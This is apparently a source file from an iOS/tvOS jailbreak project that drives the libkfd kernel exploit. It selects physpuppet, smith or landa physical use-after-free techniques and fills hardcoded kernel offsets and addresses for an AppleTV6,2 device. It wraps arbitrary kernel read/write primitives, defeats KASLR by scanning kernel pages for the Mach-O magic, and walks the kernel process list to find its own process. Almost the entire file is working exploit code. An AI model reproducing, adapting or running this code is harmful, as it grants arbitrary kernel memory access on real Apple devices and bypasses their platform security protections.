#define _DARWIN_UNLIMITED_SYSCALLS 1
#include <unistd.h>
#include "syscall_shim.h"
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wambiguous-macro"
#pragma clang diagnostic ignored "-Wunused-variable"
#pragma clang diagnostic ignored "-Wunused-but-set-variable"
#pragma clang diagnostic ignored "-Wavailability"

#import "dt_misaka_find_proc.h"
#import "dt_dynamic_patchfinder.h"
#import "Exploit/libkfd.h"
#undef T1SZ_BOOT
#import <xpc/xpc.h>
#import "info.h"
#import "primitives_external.h"
#import "dt_baked_offsets.h"
#import "dt_kfund_import.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_pte_kwrite.h"
#import "dt_session_probe.h"
#import <os/proc.h>

#if TARGET_OS_TV
#define KFD_OS16_OR_LATER 1
#define KFD_OS154_OR_LATER 1
#else
#define KFD_OS16_OR_LATER (@available(iOS 16.0, *))
#define KFD_OS154_OR_LATER (@available(iOS 15.4, *))
#endif

uint64_t gKfd = 0;

static const uint64_t kBakedStaticBase = 0xfffffff007004000ULL;

static void dt_apply_kfd_offsets_to_dynamic_info(void)
{
    const dt_kfund_offsets_t *kfund = dt_kfund_offsets_cached();
    if (!kfund->valid)
        return;

    if (kfund->proc_object_size)
        dynamic_system_info.proc__object_size = kfund->proc_object_size;
    if (kfund->cdevsw)
        dynamic_system_info.kernelcache__cdevsw = kfund->cdevsw;
    if (kfund->gPhysBase)
        dynamic_system_info.kernelcache__gPhysBase = kfund->gPhysBase;
    if (kfund->gPhysSize)
        dynamic_system_info.kernelcache__gPhysSize = kfund->gPhysSize;
    if (kfund->gVirtBase)
        dynamic_system_info.kernelcache__gVirtBase = kfund->gVirtBase;
    if (kfund->perfmon_dev_open)
        dynamic_system_info.kernelcache__perfmon_dev_open = kfund->perfmon_dev_open;
    if (kfund->perfmon_devices)
        dynamic_system_info.kernelcache__perfmon_devices = kfund->perfmon_devices;
    if (kfund->ptov_table)
        dynamic_system_info.kernelcache__ptov_table = kfund->ptov_table;
    if (kfund->vn_kqfilter)
        dynamic_system_info.kernelcache__vn_kqfilter = kfund->vn_kqfilter;
}

void dt_kfund_cache_from_dynamic_info_impl(void)
{
    dt_kfund_load_cache(
        dynamic_system_info.kernelcache__cdevsw,
        dynamic_system_info.kernelcache__gPhysBase,
        dynamic_system_info.kernelcache__gPhysSize,
        dynamic_system_info.kernelcache__gVirtBase,
        dynamic_system_info.kernelcache__perfmon_dev_open,
        dynamic_system_info.kernelcache__perfmon_devices,
        dynamic_system_info.kernelcache__ptov_table,
        dynamic_system_info.kernelcache__vn_kqfilter,
        dynamic_system_info.proc__object_size);
}

void DTBakedFillKfdDynamicInfo(void)
{
    dynamic_system_info = (struct dynamic_info){
        .kread_kqueue_workloop_ctl_supported = true,
        .krkw_iosurface_supported = false,
        .perf_supported = true,

        .kernelcache__static_base = kBakedStaticBase,

        .proc__p_list__le_next = 0x0,
        .proc__p_list__le_prev = 0x8,
        .proc__p_pid = 0x60,
        .proc__p_fd__fd_ofiles = 0xf8,
        .proc__object_size = 0x720,

        .task__map = 0x28,

        .vm_map__hdr_links_prev = 0x10,
        .vm_map__hdr_links_next = 0x18,
        .vm_map__min_offset = 0x20,
        .vm_map__max_offset = 0x28,
        .vm_map__hdr_nentries = 0x30,
        .vm_map__hdr_nentries_u64 = 0x30,
        .vm_map__hdr_rb_head_store_rbh_root = 0x38,

        .vm_map__pmap = 0x40,
        .vm_map__hint = 0x78,
        .vm_map__hole_hint = 0x80,
        .vm_map__holes_list = 0x88,
        .vm_map__object_size = 0xa0,

        .thread__thread_id = 0x430,

        .kernelcache__allproc = 0,

        .kernelcache__cdevsw = 0xfffffff007878e60ULL,
        .kernelcache__gPhysBase = 0xfffffff007152c00ULL,
        .kernelcache__gPhysSize = 0xfffffff007152c08ULL,
        .kernelcache__gVirtBase = 0xfffffff007150e18ULL,
        .kernelcache__perfmon_dev_open = 0xfffffff007324698ULL,
        .kernelcache__perfmon_devices = 0xfffffff0078ba900ULL,
        .kernelcache__ptov_table = 0xfffffff0071069a8ULL,
        .kernelcache__vn_kqfilter = 0xfffffff00736f394ULL,

        .device__T1SZ_BOOT = 25,
        .device__ARM_TT_L1_INDEX_MASK = 0x0000007000000000ULL,
    };
}

uint8_t kfd_kread8(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return (uint8_t)out;
}
uint16_t kfd_kread16(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return (uint16_t)out;
}
uint32_t kfd_kread32(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return (uint32_t)out;
}
uint64_t kfd_kread64(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return out;
}

void kfd_kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kfd_kread8(where+1);
    _buf[2] = kfd_kread8(where+2);
    _buf[3] = kfd_kread8(where+3);
    _buf[4] = kfd_kread8(where+4);
    _buf[5] = kfd_kread8(where+5);
    _buf[6] = kfd_kread8(where+6);
    _buf[7] = kfd_kread8(where+7);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kfd_kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kfd_kread16(where+2);
    _buf[2] = kfd_kread16(where+4);
    _buf[3] = kfd_kread16(where+6);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kfd_kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kfd_kread32(where+4);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kfd_kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

/* Named kfd_* so they do not shadow libjailbreak's generic kreadbuf/kwritebuf. */
int kfd_kreadbuf(uint64_t where, void *buf, size_t size)
{
    if (size == 1) {
        *(uint8_t*)buf = kfd_kread8(where);
    }
    else if (size == 2) {
        *(uint16_t*)buf = kfd_kread16(where);
    }
    else if (size == 4) {
        *(uint32_t*)buf = kfd_kread32(where);
    }
    else {
        if (size >= UINT16_MAX) {
            for (uint64_t start = 0; start < size; start += UINT16_MAX) {
                uint64_t sizeToUse = UINT16_MAX;
                if (start + sizeToUse > size) {
                    sizeToUse = (size - start);
                }
                kread((u64)(gKfd), where+start, ((uint8_t *)buf)+start, sizeToUse);
            }
        } else {
            kread((u64)(gKfd), where, buf, size);
        }
    }
    return 0;
}

int kfd_kwritebuf(uint64_t where, const void *buf, size_t size)
{
    if (size == 1) {
        kfd_kwrite8(where, *(uint8_t*)buf);
    }
    else if (size == 2) {
        kfd_kwrite16(where, *(uint16_t*)buf);
    }
    else if (size == 4) {
        kfd_kwrite32(where, *(uint32_t*)buf);
    }
    else {
        if (size >= UINT16_MAX) {
            for (uint64_t start = 0; start < size; start += UINT16_MAX) {
                uint64_t sizeToUse = UINT16_MAX;
                if (start + sizeToUse > size) {
                    sizeToUse = (size - start);
                }
                kwrite((u64)(gKfd), (void*)((uint8_t *)buf)+start, where+start, sizeToUse);
            }
        } else {
            kwrite((u64)(gKfd), (void*)buf, where, size);
        }
    }
    return 0;
}

int exploit_init(const char *flavor)
{
    dt_kfd_run_config_t cfg = {
        .puaf_flavor = flavor,
        .puaf_pages = 0,
        .kread_method = kread_kqueue_workloop_ctl,
        .kwrite_method = kwrite_sem_open,
    };
    return exploit_init_cfg(&cfg);
}

int exploit_init_cfg(const dt_kfd_run_config_t *cfg)
{
    if (!cfg || !cfg->puaf_flavor) return -1;

    dt_session_probe_exploit_init_enter();
    dt_run_log_stage("exploit_init_cfg enter");

    // J/misaka: match hw.machine + kern.osversion first, then wh1te4ever baked table.
    (void)DTApplyBakedOffsetsForCurrentDevice();

    const char *flavor = cfg->puaf_flavor;
    u64 method = 0;
    if (!strcmp(flavor, "physpuppet")) {
        method = puaf_physpuppet;
    }
    else if(!strcmp(flavor, "smith")) {
        method = puaf_smith;
    }
    else if (!strcmp(flavor, "landa")) {
        method = puaf_landa;
    }
    else {
        dt_session_probe_exploit_init_exit(-1);
        return -1;
    }

    bool isOS15 = false;
    bool use_baked = g_dt_baked_offsets_active;

    u64 kread_method = cfg->kread_method;
    u64 kwrite_method = cfg->kwrite_method;

    if (kread_method > kread_IOSurface) kread_method = kread_kqueue_workloop_ctl;
    if (kwrite_method > kwrite_IOSurface) kwrite_method = kwrite_sem_open;

    if (use_baked) {
        dt_run_log_stage("offsets: baked (AppleTV6,2 / wh1te4ever)");
        DTLogBakedStructOffsets();
        DTBakedFillKfdDynamicInfo();
        dt_kfund_cache_from_dynamic_info();
    } else if (dt_import_kfd_offsets() == 0) {
        dt_run_log_stage("offsets: kfund_offsets.plist");
        DTBakedFillKfdDynamicInfo();
        dt_apply_kfd_offsets_to_dynamic_info();
    } else {
#if TARGET_OS_TV
        dt_run_log_stage("offsets: ERROR — no baked table and no plist");
        dt_session_probe_exploit_init_exit(-1);
        return -1;
#else
        dt_run_log_stage("offsets: gSystemInfo defaults (no plist)");
    uint64_t vm_map__pmap = koffsetof(vm_map, pmap);

    uint64_t pmap_to_hint = 0;
    if (KFD_OS16_OR_LATER) {
        pmap_to_hint = 0x58;
    }
    else if (KFD_OS154_OR_LATER) {
        pmap_to_hint = 0x38;
    }
    else {
        pmap_to_hint = 0xB8;
    }

    dynamic_system_info = (struct dynamic_info){
        .kread_kqueue_workloop_ctl_supported = true,
        .krkw_iosurface_supported = (kread_method == kread_IOSurface),
        .perf_supported = (kread_method != kread_IOSurface || kwrite_method != kwrite_IOSurface),

        .kernelcache__static_base = kconstant(staticBase),

        .proc__p_list__le_next = koffsetof(proc, list_next),
        .proc__p_list__le_prev = koffsetof(proc, list_prev),
        .proc__p_pid           = koffsetof(proc, pid),
        .proc__p_fd__fd_ofiles = koffsetof(proc, fd) + koffsetof(filedesc, ofiles_start),
        .proc__object_size     = ksizeof(proc),

        .task__map = koffsetof(task, map),

        .vm_map__hdr_links_prev             = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, prev),
        .vm_map__hdr_links_next             = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, next),
        .vm_map__min_offset                 = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, min),
        .vm_map__max_offset                 = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max),
        .vm_map__hdr_nentries               = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max) + 0x8,
        .vm_map__hdr_nentries_u64           = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max) + 0x8,
        .vm_map__hdr_rb_head_store_rbh_root = koffsetof(vm_map, hdr) + koffsetof(vm_map_header, links) + koffsetof(vm_map_links, max) + 0x18,

        .vm_map__pmap        = vm_map__pmap,
        .vm_map__hint        = vm_map__pmap + pmap_to_hint,
        .vm_map__hole_hint   = vm_map__pmap + pmap_to_hint + 0x8,
        .vm_map__holes_list  = vm_map__pmap + pmap_to_hint + 0x10,
        .vm_map__object_size = vm_map__pmap + pmap_to_hint + 0x28,

        // tvOS 20L563 / T8010 — IOSurface layout from IDA (kernelcache.j105a.20L563.macho)
        .IOSurface__isa                 =   0x0,
        .IOSurface__pixelFormat         =  0xa4,
        .IOSurface__allocSize           =  0xac,
        .IOSurface__useCountPtr         =  0xc0,
        .IOSurface__indexedTimestampPtr = 0x368,  // set/getIndexedTimestamp @ a1+0x368
        .IOSurface__readDisplacement    =  0x14,

        .thread__thread_id = 0x430,

        .kernelcache__allproc          = gSystemInfo.kernelSymbol.allproc,

        .kernelcache__cdevsw           = gSystemInfo.kernelSymbol.cdevsw,
        .kernelcache__gPhysBase        = gSystemInfo.kernelSymbol.gPhysBase,
        .kernelcache__gPhysSize        = gSystemInfo.kernelSymbol.gPhysSize,
        .kernelcache__gVirtBase        = gSystemInfo.kernelSymbol.gVirtBase,
        .kernelcache__perfmon_dev_open = gSystemInfo.kernelSymbol.perfmon_dev_open,
        .kernelcache__perfmon_devices  = gSystemInfo.kernelSymbol.perfmon_devices,
        .kernelcache__ptov_table       = gSystemInfo.kernelSymbol.ptov_table,
        .kernelcache__vn_kqfilter      = gSystemInfo.kernelSymbol.vn_kqfilter,

        .device__T1SZ_BOOT            = kconstant(T1SZ_BOOT),
        .device__ARM_TT_L1_INDEX_MASK = kconstant(ARM_TT_L1_INDEX_MASK),
    };

    if (isOS15) {
        dynamic_system_info.proc__task = 0x10;
    }
    if (KFD_OS154_OR_LATER) {
        dynamic_system_info.vm_map__hdr_rb_head_store_rbh_root -= 0x8;
    }
#endif
    }

    if (use_baked || dt_kfund_offsets_cached()->valid) {
        dt_apply_kfd_offsets_to_dynamic_info();
    }

    cpu_subtype_t cpuFamily = 0;
    size_t cpuFamilySize = sizeof(cpuFamily);
    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);

    uint64_t device_memory = 0;
    size_t device_memory_size = sizeof(device_memory);
    sysctlbyname("hw.memsize", &device_memory, &device_memory_size, NULL, 0);

    size_t available_memory = os_proc_available_memory();

    int puaf_pages = cfg->puaf_pages;
    if (puaf_pages <= 0) {
        puaf_pages = 512;
        if (device_memory >= 1024 * 1024 * 1024 * 5ULL) {
            puaf_pages = 3072;
        } else if (cpuFamily == CPUFAMILY_ARM_TWISTER) {
            puaf_pages = 128;
            if (KFD_OS16_OR_LATER) {
                puaf_pages = 160;
            }
        } else if (cpuFamily == CPUFAMILY_ARM_TYPHOON) {
            puaf_pages = 256;
        } else if (cpuFamily == CPUFAMILY_ARM_HURRICANE) {
            puaf_pages = 2048;
        }
    }
    if (puaf_pages > 0x20000) puaf_pages = 0x20000;
    if (puaf_pages < 16) puaf_pages = 16;

    int grab_goal = puaf_pages / 4;
    printf("device info: CPU family: 0x%x, RAM: 0x%010llx, available: 0x%010zx\n", cpuFamily, device_memory, available_memory);
    printf("PUAF pages: %d, kread: %llu, kwrite: %llu\n", puaf_pages, kread_method, kwrite_method);

    dt_run_log("kfd config: puaf=%s pages=%d grab_goal=%d grab_max=400000 kread=%llu kwrite=%llu landa_retry=misaka cpu=0x%x ram=0x%llx avail=0x%zx",
        flavor, puaf_pages, grab_goal, kread_method, kwrite_method, cpuFamily,
        (unsigned long long)device_memory, available_memory);
    dt_run_log_stage("kopen enter (puaf+krkw+perf — panic usually here)");

    gKfd = kopen(puaf_pages, method, kread_method, kwrite_method);
    if (!gKfd) {
        dt_run_log_stage("kopen returned NULL");
        dt_session_probe_exploit_init_exit(-1);
        return -1;
    }

    dt_run_log_stage("kopen returned handle");

#if DT_POST_KOPEN_PTE
    {
        struct kfd *kf = (struct kfd *)gKfd;
        int pte_r = dt_pte_kwrite_iosurface_init(kf->puaf.number_of_puaf_pages, kf->puaf.puaf_pages_uaddr);
        if (pte_r != 0) {
            dt_run_log_stage("pte iosurface kwrite init failed build20");
            dt_run_log("pte iosurface init errno=%d", pte_r);
        }
    }
#endif

    gPrimitives.kreadbuf = kfd_kreadbuf;
    gPrimitives.kwritebuf = kfd_kwritebuf;

#if DT_PHYSRW_HANDOFF
    dt_pte_kwrite_register_perf();
#endif

    gSystemInfo.kernelConstant.slide = ((struct kfd *)gKfd)->info.kaddr.kernel_slide;
    gSystemInfo.kernelConstant.base = kconstant(staticBase) + gSystemInfo.kernelConstant.slide;

    dt_session_probe_exploit_init_exit(0);
    return 0;
}

static u64 dt_unsign_ptr(u64 p)
{
    u64 t1sz = dynamic_system_info.device__T1SZ_BOOT;
    if (!t1sz)
        t1sz = 25;
    const u64 ptr_mask = (1ULL << (64 - t1sz)) - 1;
    const u64 pac_mask = ~ptr_mask;
    if (p & (1ULL << 55))
        return p | pac_mask;
    return p & ~pac_mask;
}

static u64 dt_kaslr_defeat_sem_open(struct kfd *kfd, u64 kernel_task)
{
    u64 signed_map = 0;
    kread((u64)kfd, kernel_task + dynamic_info(task__map), &signed_map, sizeof(signed_map));
    u64 map = dt_unsign_ptr(signed_map);

    u64 signed_pmap = 0;
    kread((u64)kfd, map + dynamic_info(vm_map__pmap), &signed_pmap, sizeof(signed_pmap));
    u64 pmap = dt_unsign_ptr(signed_pmap);

    u64 tte = 0;
    kread((u64)kfd, pmap, &tte, sizeof(tte));
    u64 page = dt_unsign_ptr(tte) & 0xfffffffffffff000ULL;

    while (page) {
        u64 val = 0;
        kread((u64)kfd, page, &val, sizeof(val));
        if (val == 0x100000cfeedfacfULL) {
            u64 val24 = 0;
            kread((u64)kfd, page + 24, &val24, sizeof(val24));
            if (val24 == 0 || val24 == 2097153) {
                u64 slide = page - kBakedStaticBase;
                printf("defeated kaslr, kbase: 0x%llx, kslide: 0x%llx\n", page, slide);
                kfd->info.kaddr.kernel_slide = slide;
                return page;
            }
        }
        page -= 0x4000ULL;
    }
    return 0;
}

static void dt_fill_dynamic_from_xpf(uint64_t static_base)
{
    dynamic_system_info.kernelcache__static_base = static_base;

    // XPF/jbinfo kernelSymbol holds full unslid VAs; libkfd kernelcache__* expects the same (adds slide in perf.h).
    if (gSystemInfo.kernelSymbol.cdevsw)
        dynamic_system_info.kernelcache__cdevsw = gSystemInfo.kernelSymbol.cdevsw;
    if (gSystemInfo.kernelSymbol.gPhysBase)
        dynamic_system_info.kernelcache__gPhysBase = gSystemInfo.kernelSymbol.gPhysBase;
    if (gSystemInfo.kernelSymbol.gPhysSize)
        dynamic_system_info.kernelcache__gPhysSize = gSystemInfo.kernelSymbol.gPhysSize;
    if (gSystemInfo.kernelSymbol.gVirtBase)
        dynamic_system_info.kernelcache__gVirtBase = gSystemInfo.kernelSymbol.gVirtBase;
    if (gSystemInfo.kernelSymbol.perfmon_dev_open)
        dynamic_system_info.kernelcache__perfmon_dev_open = gSystemInfo.kernelSymbol.perfmon_dev_open;
    if (gSystemInfo.kernelSymbol.perfmon_devices)
        dynamic_system_info.kernelcache__perfmon_devices = gSystemInfo.kernelSymbol.perfmon_devices;
    if (gSystemInfo.kernelSymbol.ptov_table)
        dynamic_system_info.kernelcache__ptov_table = gSystemInfo.kernelSymbol.ptov_table;
    if (gSystemInfo.kernelSymbol.vn_kqfilter)
        dynamic_system_info.kernelcache__vn_kqfilter = gSystemInfo.kernelSymbol.vn_kqfilter;

    if (gSystemInfo.kernelStruct.proc.struct_size)
        dynamic_system_info.proc__object_size = gSystemInfo.kernelStruct.proc.struct_size;
    if (gSystemInfo.kernelConstant.T1SZ_BOOT)
        dynamic_system_info.device__T1SZ_BOOT = gSystemInfo.kernelConstant.T1SZ_BOOT;
    if (gSystemInfo.kernelConstant.ARM_TT_L1_INDEX_MASK)
        dynamic_system_info.device__ARM_TT_L1_INDEX_MASK = gSystemInfo.kernelConstant.ARM_TT_L1_INDEX_MASK;
}

int dt_dynamic_patchfinder_from_kernelfile(uint64_t kbase)
{
    return dt_kfd_apply_xpf_offsets(0, kbase);
}

int dt_dynamic_patchfinder_after_kaslr(struct kfd *kfd, uint64_t kbase)
{
    (void)kfd;
    if (!kbase)
        return -1;

    if (dt_dynamic_patchfinder_from_kernelfile(kbase) == 0)
        return 0;

    if (DTApplyBakedOffsetsForCurrentDevice()) {
        DTBakedFillKfdDynamicInfo();
        dt_kfund_cache_from_dynamic_info_impl();
        printf("[!] dynamic patchfinder: using baked offsets for this device\n");
        return 0;
    }

    return -1;
}

int dt_kfd_apply_xpf_offsets(uint64_t static_base_hint, uint64_t kbase)
{
    (void)static_base_hint;
    extern int dt_xpf_patchfind_perfkrw(uint64_t kbase, uint64_t *out_static_base);
    uint64_t static_base = 0;
    if (dt_xpf_patchfind_perfkrw(kbase, &static_base) != 0)
        return -1;

    dt_fill_dynamic_from_xpf(static_base);
    dt_kfund_cache_from_dynamic_info_impl();

    printf("gPhysBase: 0x%llx proc_object_size: 0x%llx\n",
           (unsigned long long)dt_kfund_offsets_cached()->gPhysBase,
           (unsigned long long)dt_kfund_offsets_cached()->proc_object_size);
    return 0;
}

void dt_misaka_kread_sem_open_find_proc(struct kfd *kfd)
{
    dt_run_log_stage("kread_sem_open_find_proc enter");

    volatile struct psemnode *pnode = (volatile struct psemnode *)(kfd->kread.krkw_object_uaddr);
    u64 pseminfo_kaddr = pnode->pinfo;
    u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
    u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
    u64 kernel_task = dt_unsign_ptr(task_kaddr);

    bool had_plist = (dt_import_kfd_offsets() == 0);
    if (g_dt_baked_offsets_active && !had_plist) {
        dt_kfund_cache_from_dynamic_info();
        had_plist = dt_kfund_offsets_cached()->valid;
    }

    if (!had_plist) {
        dt_run_log_stage("find_proc: no plist/baked — KASLR + patchfind");
        printf("kernel_task: 0x%llx\n", (unsigned long long)kernel_task);
        u64 kbase = dt_kaslr_defeat_sem_open(kfd, kernel_task);
        if (kbase) {
            dt_run_log_stage("KASLR defeated");
            if (dt_dynamic_patchfinder_after_kaslr(kfd, kbase) == 0) {
                dt_run_log_stage("patchfinder OK — saving plist");
                dt_apply_kfd_offsets_to_dynamic_info();
                dt_save_kfd_offsets();
            } else {
                dt_run_log_stage("patchfinder FAILED");
                printf("[!] dynamic patchfinder failed\n");
            }
        } else {
            dt_run_log_stage("KASLR defeat FAILED");
        }
    } else {
        dt_run_log_stage("find_proc: using saved plist or baked offsets");
        dt_apply_kfd_offsets_to_dynamic_info();
    }

    if (g_dt_baked_offsets_active && dt_kfund_offsets_cached()->valid && !dt_kfund_plist_on_disk()) {
        dt_run_log_stage("find_proc: auto-save baked offsets plist");
        dt_save_kfd_offsets();
    }

    u64 proc_kaddr = kernel_task - dynamic_info(proc__object_size);
    kfd->info.kaddr.kernel_proc = proc_kaddr;

    while (true) {
        i32 pid = dynamic_kget(proc__p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
            break;
        }
        proc_kaddr = dynamic_kget(proc__p_list__le_prev, proc_kaddr);
    }
    dt_run_log_stage("find_proc: current proc located");
}

#pragma clang diagnostic pop

int exploit_deinit(void)
{
    dt_session_probe_exploit_deinit_enter();

    if (gPrimitives.kreadbuf == kfd_kreadbuf) {
        gPrimitives.kreadbuf = NULL;
    }
    if (gPrimitives.kwritebuf == kfd_kwritebuf) {
        gPrimitives.kwritebuf = NULL;
    }

    if (!gKfd) {
        dt_run_log("[probe] exploit_deinit no gKfd");
        dt_session_probe_exploit_deinit_exit(-1);
        return -1;
    }

#if DT_PHYSRW_HANDOFF
    dt_pte_kwrite_unregister_perf();
#endif

#if DT_POST_KOPEN_PTE
    dt_pte_kwrite_iosurface_deinit();
#endif

    kclose(gKfd);
    gKfd = 0;

    dt_session_probe_exploit_deinit_exit(0);
    return 0;
}

uint64_t kfd_kernel_slide(void)
{
    return gSystemInfo.kernelConstant.slide;
}

uint64_t kfd_kernel_base(void)
{
    return gSystemInfo.kernelConstant.base;
}

bool dt_kfd_is_active(void)
{
    return gKfd != 0;
}

uint64_t dt_kfd_current_proc(void)
{
    if (!gKfd) return 0;
    return ((struct kfd *)gKfd)->info.kaddr.current_proc;
}

uint64_t dt_kfd_kernel_proc(void)
{
    if (!gKfd) return 0;
    return ((struct kfd *)gKfd)->info.kaddr.kernel_proc;
}
